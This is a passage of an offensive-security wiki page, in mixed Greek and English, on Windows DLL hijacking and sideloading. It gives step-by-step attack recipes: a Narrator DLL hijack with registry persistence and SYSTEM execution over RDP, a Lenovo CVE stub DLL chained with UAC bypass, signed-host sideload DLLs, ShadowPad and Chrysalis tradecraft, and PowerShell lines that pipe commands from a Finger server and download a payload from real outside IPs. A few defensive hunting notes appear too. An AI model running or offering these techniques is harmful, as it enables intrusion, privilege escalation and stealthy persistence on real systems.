BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη Περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί να ελέγχει κατά την εκκίνηση ένα προβλέψιμο, language-specific localization DLL, το οποίο μπορεί να hijacked για arbitrary code execution και persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC σιωπή
- Ένα naïve hijack θα μιλήσει/θα τονίσει το UI. Για να μείνεις αθόρυβος, κατά το attach κάνε enumerate τα Narrator threads, άνοιξε το main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) και `SuspendThread` it; συνέχισε στο δικό σου thread. Δες το PoC για πλήρη code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, το start του Narrator φορτώνει το planted DLL. Στο secure desktop (logon screen), πάτησε CTRL+WIN+ENTER για να ξεκινήσεις το Narrator; το DLL σου εκτελείται ως SYSTEM στο secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP στο host, στο logon screen πάτησε CTRL+WIN+ENTER για να εκκινήσεις το Narrator; το DLL σου εκτελείται ως SYSTEM στο secure desktop.
- Η εκτέλεση σταματά όταν κλείσει το RDP session—κάνε inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείς να κάνεις clone μια built-in Accessibility Tool (AT) registry entry (π.χ. CursorIndicator), να την επεξεργαστείς ώστε να δείχνει σε ένα arbitrary binary/DLL, να την κάνεις import και μετά να ορίσεις το `configuration` σε εκείνο το AT name. Αυτό κάνει proxy arbitrary execution μέσα από το Accessibility framework.

Notes
- Το writing στο `%windir%\System32` και η αλλαγή HKLM values απαιτούν admin rights.
- Όλη η payload logic μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`; δεν χρειάζονται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Αυτό το case δείχνει **Phantom DLL Hijacking** στο Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), με tracking ως **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

Ένας attacker μπορεί να τοποθετήσει ένα malicious `hostfxr.dll` stub στον ίδιο φάκελο, εκμεταλλευόμενος το missing DLL για να πετύχει code execution υπό το context του χρήστη:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Ως standard user, ρίξε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περίμενε να εκτελεστεί το scheduled task στις 9:30 AM στο context του τρέχοντος user.
3. Αν υπάρχει logged in administrator όταν εκτελείται το task, το malicious DLL τρέχει στο session του administrator με medium integrity.
4. Κάνε chain standard UAC bypass techniques για να ανέβεις από medium integrity σε SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Οι threat actors συχνά συνδυάζουν MSI-based droppers με DLL side-loading για να εκτελέσουν payloads κάτω από trusted, signed process.

Chain overview
- Ο user κατεβάζει το MSI. Ένα CustomAction εκτελείται silently κατά τη διάρκεια του GUI install (π.χ. LaunchApplication ή μια VBScript action), αναδομώντας το επόμενο stage από embedded resources.
- Το dropper γράφει ένα legitimate, signed EXE και ένα malicious DLL στον ίδιο κατάλογο (παράδειγμα ζεύγους: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν ξεκινά το signed EXE, το Windows DLL search order φορτώνει πρώτα το wsc.dll από το working directory, εκτελώντας attacker code κάτω από signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Ψάξε για entries που εκτελούν executables ή VBScript. Example suspicious pattern: LaunchApplication που εκτελεί ένα embedded file στο background.
- Στο Orca (Microsoft Orca.exe), έλεγξε τα CustomAction, InstallExecuteSequence και Binary tables.
- Embedded/split payloads στο MSI CAB:
- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- Ή χρησιμοποίησε lessmsi: `lessmsi x package.msi C:\out`
- Ψάξε για multiple small fragments που concatenated και decrypted από ένα VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμος signed host (Avast). Η process προσπαθεί να φορτώσει το wsc.dll με όνομα από τον κατάλογό της.
- wsc.dll: attacker DLL. Αν δεν απαιτούνται συγκεκριμένα exports, το DllMain μπορεί να αρκεί· διαφορετικά, φτιάξτε ένα proxy DLL και κάντε forward τα απαιτούμενα exports στη genuine library ενώ εκτελείτε το payload στο DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για export requirements, use a proxying framework (e.g., DLLirant/Spartacus) to generate a forwarding DLL that also executes your payload.

- Αυτή η technique βασίζεται στο DLL name resolution από το host binary. Αν το host χρησιμοποιεί absolute paths ή safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- KnownDLLs, SxS και forwarded exports μπορούν να επηρεάσουν την precedence και πρέπει να ληφθούν υπόψη κατά την επιλογή του host binary και του export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Το Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας μια **three-file triad** για να περνά απαρατήρητο ως legitimate software, ενώ κρατά το core payload encrypted στο disk:

1. **Signed host EXE** – vendors όπως AMD, Realtek ή NVIDIA abused (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι attackers μετονομάζουν το executable ώστε να μοιάζει με Windows binary (για παράδειγμα `conhost.exe`), αλλά το Authenticode signature παραμένει valid.
2. **Malicious loader DLL** – dropped δίπλα στο EXE με αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Το DLL είναι συνήθως ένα MFC binary obfuscated με το ScatterBrain framework· η μοναδική του δουλειά είναι να εντοπίσει το encrypted blob, να το decrypt και να κάνει reflectively map το ShadowPad.
3. **Encrypted payload blob** – συχνά stored ως `<name>.tmp` στον ίδιο directory. Αφού κάνει memory-mapping το decrypted payload, το loader διαγράφει το TMP file για να καταστρέψει forensic evidence.

Tradecraft notes:

* Η μετονομασία του signed EXE (ενώ διατηρείται το original `OriginalFileName` στο PE header) του επιτρέπει να masquerade ως Windows binary αλλά να διατηρεί το vendor signature, οπότε replicate τη συνήθεια του Ink Dragon να ρίχνει binaries που μοιάζουν με `conhost.exe` αλλά είναι στην πραγματικότητα AMD/NVIDIA utilities.
* Επειδή το executable παραμένει trusted, τα περισσότερα allowlisting controls χρειάζονται μόνο το malicious DLL να βρίσκεται δίπλα του. Εστίασε στο customizing του loader DLL· το signed parent συνήθως μπορεί να τρέξει untouched.
* Το ShadowPad decryptor αναμένει ότι το TMP blob θα βρίσκεται δίπλα στο loader και θα είναι writable ώστε να μπορεί να μηδενίσει το αρχείο μετά το mapping. Κράτα τον directory writable μέχρι να φορτώσει το payload· μόλις μπει στη μνήμη, το TMP file μπορεί να διαγραφεί με ασφάλεια για OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger finger → tar/curl → WMI)

Οι operators συνδυάζουν DLL sideloading με LOLBAS ώστε το μόνο custom artifact στο disk να είναι το malicious DLL δίπλα στο trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell κάνει spawn το `cmd.exe /c`, παίρνει commands από ένα Finger server και τα περνά στο `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` τραβά TCP/79 text· το `| cmd` εκτελεί την απόκριση του server, επιτρέποντας στους operators να αλλάζουν το second stage server-side.

- **Built-in download/extract:** Κατέβασε ένα archive με benign extension, αποσυμπίεσέ το και στήσε το sideload target μαζί με το DLL κάτω από έναν τυχαίο `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- Το `curl -s -L` κρύβει την πρόοδο και ακολουθεί redirects· το `tar -xf` χρησιμοποιεί το built-in tar των Windows.

- **WMI/CIM launch:** Ξεκίνα το EXE μέσω WMI ώστε η telemetry να δείχνει ένα CIM-created process ενώ φορτώνει το colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Λειτουργεί με binaries που προτιμούν local DLLs (e.g., `intelbq.exe`, `nearby_share.exe`)· το payload (e.g., Remcos) τρέχει κάτω από το trusted όνομα.

- **Hunting:** Alert on `forfiles` όταν τα `/p`, `/m` και `/c` εμφανίζονται μαζί· ασυνήθιστο εκτός από admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Μια πρόσφατη intrusion της Lotus Blossom abused μια trusted update chain για να παραδώσει ένα NSIS-packed dropper που έστησε ένα DLL sideload plus fully in-memory payloads.

Tradecraft flow
- Το `update.exe` (NSIS) δημιουργεί το `%AppData%\Bluetooth`, το μαρκάρει ως **HIDDEN**, ρίχνει ένα renamed Bitdefender Submission Wizard `BluetoothService.exe`, ένα malicious `log.dll`, και ένα encrypted blob `BluetoothService`, και μετά ξεκινά το EXE.
- Το host EXE κάνει import το `log.dll` και καλεί `LogInit`/`LogWrite`. Το `LogInit` mmap-loads το blob· το `LogWrite` το decrypts με ένα custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material derived από ένα prior hash), overwrites το buffer με plaintext shellcode, frees temps και κάνει jump σε αυτό.
- Για να αποφύγει ένα IAT, το loader λύνει APIs κάνοντας hashing τα export names με **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, και μετά εφαρμόζει ένα Murmur-style avalanche (**0x85EBCA6B**) και συγκρίνει με salted target hashes.

Main shellcode (Chrysalis)
- Decrypts ένα PE-like main module επαναλαμβάνοντας add/XOR/sub με key `gQ2JR&9;` σε πέντε passes, και μετά φορτώνει δυναμικά `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει την import resolution.
- Reconstructs DLL name strings at runtime μέσω per-character bit-rotate/XOR transforms, και μετά φορτώνει `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί έναν second resolver που διασχίζει το **PEB → InMemoryOrderModuleList**, κάνει parse κάθε export table σε 4-byte blocks με Murmur-style mixing, και πέφτει πίσω στο `GetProcAddress` μόνο αν το hash δεν βρεθεί.

Embedded configuration & C2
- Το config βρίσκεται μέσα στο dropped `BluetoothService` file στο **offset 0x30808** (size **0x980**) και decrypt-άρεται με RC4 key `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
- Τα beacons χτίζουν ένα dot-delimited host profile, προσθέτουν tag `4Q`, και μετά κάνουν RC4-encrypt με key `vAuig34%^325hGV` πριν το `HttpSendRequestA` over HTTPS. Οι responses RC4-decrypt-άρονται και αποστέλλονται μέσω ενός tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Το execution mode ελέγχεται από CLI args: no args = install persistence (service/Run key) που δείχνει στο `-i`; το `-i` κάνει relaunch τον εαυτό του με `-k`; το `-k` παραλείπει το install και τρέχει το payload.

Alternate loader observed
- Η ίδια intrusion έριξε Tiny C Compiler και εκτέλεσε `svchost.exe -nostdlib -run conf.c` από το `C:\ProgramData\USOShared\`, με το `libtcc.dll` δίπλα του. Το attacker-supplied C source embedded shellcode, compiled και τρέχτηκε in-memory χωρίς να αγγίξει το disk με ένα PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Αυτό το TCC-based compile-and-run stage imported `Wininet.dll` at runtime και τράβηξε ένα second-stage shellcode από ένα hardcoded URL, δίνοντας έναν ευέλικτο loader που προσποιούνταν ότι είναι compiler run.

## Signed-host sideloading με export proxying + host thread parking

Κάποιες DLL sideloading chains προσθέτουν **stability engineering** ώστε το νόμιμο host να παραμένει ζωντανό αρκετά ώστε να φορτώσει καθαρά τα επόμενα stages αντί να κρασάρει αφού φορτωθεί το malicious DLL.

Observed pattern
- Drop ένα trusted EXE δίπλα σε ένα malicious DLL χρησιμοποιώντας το αναμενόμενο dependency name όπως `version.dll`.
- Το malicious DLL **proxies every expected export** πίσω στο πραγματικό system DLL (για παράδειγμα `%SystemRoot%\\System32\\version.dll`) ώστε το import resolution να συνεχίσει να πετυχαίνει και το host process να λειτουργεί.
- Μετά το load, το malicious DLL **patches the host entry point** ώστε το main thread να πέσει σε ένα infinite `Sleep` loop αντί να τερματίσει ή να εκτελέσει code paths που θα έκλειναν το process.
- Ένα νέο thread εκτελεί το πραγματικό malicious work: decrypting το next-stage DLL name ή path (RC4/XOR είναι συνηθισμένα), και μετά launching it με `LoadLibrary`.

Why this matters
- Το κανονικό DLL proxying διατηρεί API compatibility, αλλά δεν εγγυάται ότι το host θα μείνει ζωντανό αρκετά για τα επόμενα stages.
- Το να βάζεις το main thread σε `Sleep(INFINITE)` είναι ένας απλός τρόπος να κρατήσεις το signed process resident ενώ το loader κάνει decryption, staging ή network bootstrap σε worker thread.
- Η αναζήτηση μόνο για ύποπτο `DllMain` θα χάσει αυτό το pattern αν η ενδιαφέρουσα συμπεριφορά συμβαίνει αφού γίνει patch το host entry point και ξεκινήσει δευτερεύον thread.

Minimal workflow
1. Copy το signed host EXE και προσδιόρισε το DLL που λύνει από τον local directory.
2. Build ένα proxy DLL που εξάγει τις ίδιες functions και τα forwardάρει στο νόμιμο DLL.
3. Στο `DllMain(DLL_PROCESS_ATTACH)`, δημιούργησε ένα worker thread.
4. Από εκείνο το thread, patch το host entry point ή τη main thread start routine ώστε να κάνει loop στο `Sleep`.
5. Decrypt το next-stage DLL name/config και κάλεσε `LoadLibrary` ή manual-map το payload.

Defensive pivots
- Signed processes που φορτώνουν `version.dll` ή παρόμοια common libraries από το δικό τους application directory αντί από το `System32`.
- Memory patches στο process entry point λίγο μετά το image load, ειδικά jumps/calls που ανακατευθύνονται σε `Sleep`/`SleepEx`.
- Threads που δημιουργούνται από ένα proxy DLL και αμέσως καλούν `LoadLibrary` σε ένα δεύτερο DLL με decrypted name.
- Full-export proxy DLLs τοποθετημένα δίπλα σε vendor executables μέσα σε writable staging directories όπως `ProgramData`, `%TEMP%`, ή unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
